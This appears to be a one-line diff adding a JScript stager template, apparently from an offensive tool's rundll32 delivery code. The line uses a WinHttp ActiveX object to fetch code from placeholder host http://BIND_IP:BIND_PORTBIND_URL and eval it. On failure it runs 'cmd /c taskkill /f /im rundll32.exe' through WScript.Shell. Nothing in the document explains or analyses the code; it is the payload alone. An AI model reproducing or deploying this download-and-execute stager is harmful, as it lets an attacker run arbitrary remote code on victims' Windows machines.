@@ -1,0 +1,1 @@
+document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://BIND_IP:BIND_PORTBIND_URL",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){alert(e);new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}
